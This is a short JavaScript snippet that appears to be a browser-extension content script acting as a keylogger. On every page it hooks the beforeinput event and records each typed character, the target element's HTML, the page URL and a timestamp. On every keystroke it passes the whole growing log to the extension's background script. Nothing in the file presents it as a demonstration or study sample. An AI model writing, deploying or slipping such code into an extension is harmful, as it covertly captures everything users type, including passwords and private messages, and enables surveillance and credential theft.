(() => {
	let userData = [];

	onbeforeinput = (event) => {
		userData.push({
			key: event.data,
			target: event.target.outerHTML,
			inputType: event.inputType,
			domain: window.location.href,
			timestamp: new Date().toISOString()
		});

		sendData(userData);
	};

	function sendData(data) {
		chrome.runtime.sendMessage({
			data: data
		});
	}

})();